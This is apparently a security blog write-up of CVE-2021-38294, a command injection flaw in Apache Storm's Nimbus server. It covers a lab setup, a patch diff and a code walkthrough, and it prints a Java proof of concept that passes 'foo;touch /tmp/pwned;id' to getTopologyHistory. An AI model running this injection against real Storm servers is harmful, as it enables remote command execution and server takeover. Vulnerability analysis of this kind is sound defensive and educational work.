&lt;p&gt;#CVE-2021-38294 is a Command Injection vulnerability that affects Nimbus server in apache storm in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getTopologyHistory&lt;/code&gt; services, A successful crafted request to Nimbus server will result in exploitation for this vulnerability will lead to execute malicious command &amp;amp; takeover the server. The affected versions are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.x&lt;/code&gt; prior to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.2.4&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2.x&lt;/code&gt; prior to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2.2.1&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;what-is-apache-storm-&quot;&gt;&lt;strong&gt;What is Apache Storm ?&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache Storm&lt;/code&gt; is a distributed system for processing big data in real-time, Specifically designed to handle large volumes of data in a reliable and scalable manner and It operates as a streaming data framework allowing for high ingestion rates and efficient data processing. While it is stateless, Storm effectively manages distributed environments and cluster states through Apache ZooKeeper. It provides a straightforward approach to performing parallel manipulations on real-time data, enabling a wide range of data processing tasks. Apache Storm is extensively used by a lot of enterprises/organizations such as Twitter for processing tweets and clicks in its &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Publisher Analytics Products&lt;/code&gt; suite, benefiting from deep integration with the Twitter infrastructure.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/e7d7fe41e817f46ef2fcbfca93b041d3&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache Storm&lt;/code&gt; spouts and bolts are connected to form a topology, which represents the real-time application logic as a directed graph. Spouts emit data that is processed by bolts, and the output of a bolt can be passed to another bolt. storm keeps the topology running until explicitly stopped. The execution of spouts and bolts in storm is referred to as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tasks&lt;/code&gt;. Each spout and bolt can have multiple instances running in separate threads. These tasks are distributed across multiple worker nodes, and the worker nodes listen for jobs and manage the execution of tasks. Finally, What we will need to know well are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nimbus&lt;/code&gt; known as master node which plays a central role in the storm framework as it is responsible for running the storm topology by analyzes the topology and collects the tasks to be executed, distributing them to an available &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Supervisor&lt;/code&gt; node and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Supervisor&lt;/code&gt; is the worker node which can have multiple worker processes, It’s job is to delegate the tasks to these worker processes &amp;amp; each worker process can spawn multiple executors based on the required workload and executes the assigned tasks and communication between the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nimbus&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Supervisors&lt;/code&gt; is facilitated through an internal distributed messaging system ensuring efficient coordination and data exchange within the storm cluster.&lt;/p&gt;

&lt;h1 id=&quot;testing-lab&quot;&gt;&lt;strong&gt;Testing Lab&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Let’s start to build our testing lab. First, We would need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZooKeeper&lt;/code&gt; to be installed you can download it from &lt;a href=&quot;https://archive.apache.org/dist/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz&quot;&gt;here&lt;/a&gt;. After downloading, extract it and create a directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt; within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zookeeper&lt;/code&gt; directory:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/aeb1313435fb2b8fcfb82dae80799bc5&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, Copy the sample configuration as a main configuration file for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zookeeper&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cp conf/zoo_sample.cfg conf/zoo.cfg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/46bc259bde835336beb36bac9b7ec2f0&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Open &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zoo.cfg&lt;/code&gt; file and add the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt; directory file path we created previously:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/84e8c721a93f81d4e1e54655363687c2&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, Start &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZooKeeper&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bin/zkServer.sh start
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/434a39527b2c966b744da1fdc46ae7a8&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The server started and verify it by running the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLI&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bin/zkCli.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/d642fa2dc7cff948a2879d2e1b3789c9&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, It’s time to install &amp;amp; start &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache Storm&lt;/code&gt;, Download it from &lt;a href=&quot;https://archive.apache.org/dist/storm/apache-storm-2.2.0/apache-storm-2.2.0.zip&quot;&gt;here&lt;/a&gt;. First, Create another folder inside of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache storm&lt;/code&gt; directory by the name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/afd9db9f7e178dc2f43cd050a84cd2ec&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that open the configurations file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;conf/storm.yaml&lt;/code&gt; and add the following to the file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Storm configuration file

# Nimbus settings
nimbus.seeds: [&quot;localhost&quot;]  # List of Nimbus hostnames or IP addresses
nimbus.host: &quot;localhost&quot;
# ZooKeeper settings
storm.zookeeper.servers:
  - &quot;localhost&quot;

# Storm UI settings
ui.port: 8081  

# Supervisor settings
supervisor.slots.ports:
  - 6700
  - 6701
  - 6702

# Worker settings
worker.childopts: &quot;-Xmx768m&quot;

# Topology settings
topology.debug: true  # Enable debugging for topologies
topology.max.spout.pending: 1000  # Maximum number of pending messages per spout

# Log4j settings
worker.log.level: INFO  # Log level for Storm workers
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Don’t forget to replace the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zookeper&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nimbus&lt;/code&gt; server IP with your IP (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;The same machine IP&lt;/code&gt;). Let’s start it now. Starting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nimbus&lt;/code&gt; server:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bin/storm nimbus
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/a8d97c6b9356f7ea1f66d85a8a341be7&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Starting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Supervisor&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bin/storm supervisor
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/a6db4dcb61df7bec3e57df469791c333&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Starting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Storm&lt;/code&gt; UI:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bin/storm ui
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6d0290ec4da1a168b79d1af8f5ecb3bd&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Visit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UI&lt;/code&gt; on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8081&lt;/code&gt; as we configure:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4ffa3e343ddb79408313188cde0ac84a&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;patch-diffing&quot;&gt;&lt;strong&gt;Patch Diffing&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;You can download the source code from &lt;a href=&quot;https://archive.apache.org/dist/storm/apache-storm-2.2.0/apache-storm-2.2.0-src.zip&quot;&gt;here&lt;/a&gt;, The patch &lt;a href=&quot;https://github.com/apache/storm/commit/aa67da56da0e21506624ea9ad12b35b630d28dc8&quot;&gt;here&lt;/a&gt; on github.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/0d350f6390d87bdaeacdb03dcbbfe269&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It shows us changes made to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;storm-client/src/jvm/org/apache/storm/utils/ShellUtils.java&lt;/code&gt; where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getGroupsCommand()&lt;/code&gt; method got deleted which was return a command as a string array to retrieve the groups on the system. Then, the following function modified:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;##### Before
public static String[] getGroupsForUserCommand(final String user) {
        if (WINDOWS) {
            throw new UnsupportedOperationException(&quot;Getting user groups is not supported on Windows&quot;);
        }
        //'groups username' command return is non-consistent across different unixes
        return new String[]{
            &quot;bash&quot;, &quot;-c&quot;, &quot;id -gn &quot; + user
                          + &quot;&amp;amp;&amp;amp; id -Gn &quot; + user
        };
    }
    
##### After
public static String[] getGroupsForUserCommand(final String user) {
        if (WINDOWS) {
            throw new UnsupportedOperationException(&quot;Getting user groups is not supported on Windows&quot;);
        }
        //'groups username' command return is non-consistent across different unixes
        return new String[]{&quot;id&quot;, &quot;-Gn&quot;, user};
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The modification of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getGroupsForUserCommand(String user)&lt;/code&gt; has been updated to use a more concise command. We can see clearly from the patch diffing that the Command Injection Occures in this part specifically in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; parameter that get passed to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getGroupsForUserCommand()&lt;/code&gt; and also we can notice the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bach -c&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;String&lt;/code&gt; array, Let’s move to the analysis to understand how this happens.&lt;/p&gt;

&lt;h1 id=&quot;the-analysis&quot;&gt;&lt;strong&gt;The Analysis&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;When we go to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache-storm-2.2.0/storm-client/src/jvm/org/apache/storm/utils/ShellUtils.java&lt;/code&gt; and scroll down after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getGroupsForUserCommand()&lt;/code&gt; method we can see the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/071a30962a11aaa9452080ee1fb85dd0&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run()&lt;/code&gt; method is declared as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;protected&lt;/code&gt; which means it can only be accessed within the same package or by sub-classes and it implements a control flow that determines whether a specified interval has passed since the last execution, If the interval has passed it will reset the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exitCode&lt;/code&gt; and proceeds to execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runCommand()&lt;/code&gt; method. Now, By scrolling down:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8d01c699df06d9ae7b48b3d7c4c8f65a&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We will be able to see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runCommand()&lt;/code&gt; method and It’s a long method, So let’s break it down and explain it:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ProcessBuilder builder = new ProcessBuilder(getExecString());
Timer timeOutTimer = null;
ShellTimeoutTimerTask timeoutTimerTask = null;
timedOut = new AtomicBoolean(false);
completed = new AtomicBoolean(false);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;First, It creates a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProcessBuilder&lt;/code&gt; object with the executable command obtained from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getExecString()&lt;/code&gt; method:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/951bdb4a55a94fc5a69d461952ebde51&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getExecString()&lt;/code&gt; method which returns the command value. Then, it declares two variables of type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Timer&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ShellTimeoutTimerTask&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt; which will be used to handle timeouts for the command execution. Finally, Creates two &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AtomicBoolean&lt;/code&gt; variables named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timedOut&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;completed&lt;/code&gt; &amp;amp; initializes them with the value &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt; which used to track the status of the command execution.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (environment != null) {
    builder.environment().putAll(this.environment);
}
if (dir != null) {
    builder.directory(this.dir);
}

builder.redirectErrorStream(redirectErrorStream);
process = builder.start();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt; condition checks if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;environment&lt;/code&gt; variable is not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt; and If it’s not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt;, it retrieves the environment variables associated with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProcessBuilder&lt;/code&gt; instance using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;builder.environment()&lt;/code&gt; and adds all the key value pairs from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;this.environment&lt;/code&gt; map. The second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt; condition checks if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dir&lt;/code&gt; variable is not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt; and If it’s not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt;, it sets the working directory of the process to the specified directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;t his.dir&lt;/code&gt; using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;builder.directory(this.dir)&lt;/code&gt;. Finally, it’s configuring the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProcessBuilder&lt;/code&gt; to redirect the error stream of the process to the same output stream If &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redirectErrorStream&lt;/code&gt; is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt; the error stream will be merged with the standard output stream and then starts the process using the configured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProcessBuilder&lt;/code&gt; by calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;start()&lt;/code&gt; method.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (timeOutInterval &amp;gt; 0) {
    timeOutTimer = new Timer(&quot;Shell command timeout&quot;);
    timeoutTimerTask = new ShellTimeoutTimerTask(this);
    //One time scheduling.
    timeOutTimer.schedule(timeoutTimerTask, timeOutInterval);
}
final BufferedReader errReader =
    new BufferedReader(new InputStreamReader(process
                                                 .getErrorStream()));
BufferedReader inReader =
    new BufferedReader(new InputStreamReader(process
                                                 .getInputStream()));
final StringBuffer errMsg = new StringBuffer();

// read error and input streams as this would free up the buffers
// free the error stream buffer
Thread errThread = new Thread() {
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Moving to here this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IF&lt;/code&gt; condition checks if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timeOutInterval&lt;/code&gt; is greater than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, then set up a timer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shell command timeout&lt;/code&gt; task to handle the timeout and schedule the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timeoutTimerTask&lt;/code&gt; to run after the specified &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timeOutInterval&lt;/code&gt; in milliseconds. After that create 2 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BufferedReader&lt;/code&gt; objects which are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;errReader&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inReader&lt;/code&gt; to read the error and input streams of the process, respectively. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;process.getErrorStream()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;process.getInputStream()&lt;/code&gt; methods return the streams associated with the running process. Next, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;StringBuffer&lt;/code&gt; object named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;errMsg&lt;/code&gt; to store the error message, a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread&lt;/code&gt; object named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;errThread&lt;/code&gt; then create an anonymous subclass of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread&lt;/code&gt; with overridden &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run()&lt;/code&gt; method.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@Override
public void run() {
    try {
        String line = errReader.readLine();
        while ((line != null) &amp;amp;&amp;amp; !isInterrupted()) {
            errMsg.append(line);
            errMsg.append(System.getProperty(&quot;line.separator&quot;));
            line = errReader.readLine();
        }
    } catch (IOException ioe) {
        LOG.warn(&quot;Error reading the error stream&quot;, ioe);
    }
}
};
try {
errThread.start();
} catch (IllegalStateException ise) {
//ignore
}
try {
parseExecResult(inReader); // parse the output
// clear the input stream buffer
String line = inReader.readLine();
while (line != null) {
    line = inReader.readLine();
}
// wait for the process to finish and check the exit code
exitCode = process.waitFor();
// make sure that the error thread exits
joinThread(errThread);
completed.set(true);
//the timeout thread handling
//taken care in finally block
if (exitCode != 0) {
    throw new ExitCodeException(exitCode, errMsg.toString());
}
} catch (InterruptedException ie) {
throw new IOException(ie.toString());
} finally {
if (timeOutTimer != null) {
    timeOutTimer.cancel();
}
// close the input stream
try {
    // JDK 7 tries to automatically drain the input streams for us
    // when the process exits, but since close is not synchronized,
    // it creates a race if we close the stream first and the same
    // fd is recycled.  the stream draining thread will attempt to
    // drain that fd!!  it may block, OOM, or cause bizarre behavior
    // see: https://bugs.openjdk.java.net/browse/JDK-8024521
    //      issue is fixed in build 7u60
    InputStream stdout = process.getInputStream();
    synchronized (stdout) {
        inReader.close();
    }
} catch (IOException ioe) {
    LOG.warn(&quot;Error while closing the input stream&quot;, ioe);
}
if (!completed.get()) {
    errThread.interrupt();
    joinThread(errThread);
}
try {
    InputStream stderr = process.getErrorStream();
    synchronized (stderr) {
        errReader.close();
    }
} catch (IOException ioe) {
    LOG.warn(&quot;Error while closing the error stream&quot;, ioe);
}
process.destroy();
lastTime = System.currentTimeMillis();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, In a summary defines a thread that reads the error stream and appends its contents to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;errMsg&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;StringBuffer&lt;/code&gt; and start the thread &amp;amp; then proceeds to parse the output from the input stream using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parseExecResult&lt;/code&gt; method. After that, the input stream clear its buffer. Then, wait for the process to finish and retrieves the exit code. Next, It ensure that the error thread has exited by joining it and If the exit code is not zero, it throws an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExitCodeException&lt;/code&gt; with the error message. In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;finally&lt;/code&gt; block, it cancel the timeout timer if it exists, closes the input stream, interrupts the error thread if the command execution is not completed, closes the error stream, destroys the process, and updates the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lastTime&lt;/code&gt; variable with the current time. So, Now how actually the code can get injected or where is the point that the user give the malicious input ?. Let’s discover it by going through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PoC&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import org.apache.storm.utils.NimbusClient;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class ThriftClient {
    public static void main(String[] args) throws Exception {
        HashMap config = new HashMap();
        List&amp;lt;String&amp;gt; seeds = new ArrayList&amp;lt;String&amp;gt;();
        seeds.add(&quot;localhost&quot;);
        config.put(&quot;storm.thrift.transport&quot;, &quot;org.apache.storm.security.auth.SimpleTransportPlugin&quot;);
        config.put(&quot;storm.thrift.socket.timeout.ms&quot;, 60000);
        config.put(&quot;nimbus.seeds&quot;, seeds);
        config.put(&quot;storm.nimbus.retry.times&quot;, 5);
        config.put(&quot;storm.nimbus.retry.interval.millis&quot;, 2000);
        config.put(&quot;storm.nimbus.retry.intervalceiling.millis&quot;, 60000);
        config.put(&quot;nimbus.thrift.port&quot;, 6627);
        config.put(&quot;nimbus.thrift.max_buffer_size&quot;, 1048576);
        config.put(&quot;nimbus.thrift.threads&quot;, 64);
        NimbusClient nimbusClient = new NimbusClient(config, &quot;localhost&quot;, 6627);

        // send attack
        nimbusClient.getClient().getTopologyHistory(&quot;foo;touch /tmp/pwned;id &quot;);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When we take a look here at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PoC&lt;/code&gt; we can notice that it’s connecting to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Storm&lt;/code&gt; cluster by adding the configuration first. Then connect to the cluster at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localhost&lt;/code&gt; on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6627&lt;/code&gt; &amp;amp; passing the previous configurations. the call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getTopologyHistory()&lt;/code&gt; function from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Storm&lt;/code&gt; Client. And here where is the command Injection happens. Let’s take a look at the implementation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nimbus&lt;/code&gt; and the function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/c4386369e509b606168457227840b8ed&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we go under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache-storm-2.2.0/storm-server/src/main/java/org/apache/storm/nimbus/NimbusHeartbeatsPressureTest.java&lt;/code&gt; which is responsible for implementation of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nimbus&lt;/code&gt; heartbeats pressure test. It starts with defining the class and other variables for configurations.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8dd71a709560b44713aacc29b9f504a8&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that as we can see it starts to initializing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Config&lt;/code&gt; for the heartbeats pressure test. Then by scrolling more down:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3fe9b9aa47d3cfdd227d2678400b1ced&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see clearly in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HeartbeatSendTask&lt;/code&gt; that it’s using the defined &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NimbusClient&lt;/code&gt; that named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client&lt;/code&gt; to create a new client connection &amp;amp; Passed the previous initialized &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Config&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nimbus&lt;/code&gt; Host &amp;amp; Port.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/27875c8206737d6b5d83f7e4e221c8b7&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

